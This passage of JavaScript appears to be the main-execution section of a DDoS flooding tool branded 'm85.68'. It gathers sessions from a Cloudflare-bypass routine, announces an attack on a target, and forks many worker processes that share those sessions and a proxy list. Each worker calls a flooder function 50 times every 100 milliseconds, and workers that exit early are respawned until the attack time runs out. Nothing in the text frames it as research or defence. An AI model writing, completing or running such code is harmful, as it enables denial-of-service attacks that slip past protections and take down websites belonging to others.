global.failedProxies = new Set();
global.proxyIndex = 0;

// Main execution
if (cluster.isMaster) {
    printHeader();
    
    bypassCloudflareParallel(args.cookieCount).then((bypassResults) => {
        global.bypassData = bypassResults;
        
        console.log(`\n${COLORS.green}ðŸŽ‰ m85.68: Successfully obtained ${bypassResults.length} sessions!${COLORS.reset}`);
        console.log(`${COLORS.magenta}ðŸ”¥ m85.68: Starting attack on ${args.target}...${COLORS.reset}\n`);
        
        global.startTime = Date.now();
        
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ 
                type: 'bypassData', 
                data: bypassResults,
                proxies: proxies
            });
        }
        
        cluster.on('exit', (worker) => {
            if (Date.now() - global.startTime < args.time * 1000) {
                const newWorker = cluster.fork();
                newWorker.send({ 
                    type: 'bypassData', 
                    data: global.bypassData,
                    proxies: proxies
                });
            }
        });
        
        setTimeout(() => {
            console.log(`\n${COLORS.green}ðŸ m85.68: Attack completed!${COLORS.reset}`);
            process.exit(0);
        }, args.time * 1000);
    }).catch((error) => {
        console.log(`${COLORS.red}âŒ m85.68: Fatal error in main execution: ${error.message}${COLORS.reset}`);
        process.exit(1);
    });
} else {
    let workerBypassData = [];
    let workerProxies = [];
    let attackInterval;
    global.proxyIndex = 0;
    
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            workerBypassData = msg.data;
            workerProxies = msg.proxies;
            global.bypassData = msg.data;
            
            console.log(`${COLORS.cyan}ðŸ› ï¸ m85.68: Worker received ${global.bypassData.length} sessions, starting attack interval...${COLORS.reset}`);
            attackInterval = setInterval(() => {
                for (let i = 0; i < 50; i++) {
                    runFlooder();
                }
            }, 100);
        }
    });
    
    setTimeout(() => {
        if (attackInterval) clearInterval(attackInterval);
        console.log(`${COLORS.blue}ðŸ”’ m85.68: Worker shutting down${COLORS.reset}`);
        process.exit(0);
    }, args.time * 1000);
}

process.on('uncaughtException', (err) => {
    console.log(`${COLORS.red}âŒ m85.68: Uncaught Exception: ${err.message}${COLORS.reset}`);
});
process.on('unhandledRejection', (reason, promise) => {
    console.log(`${COLORS.red}âŒ m85.68: Unhandled Rejection: ${(reason.message || reason)}${COLORS.reset}`);
});
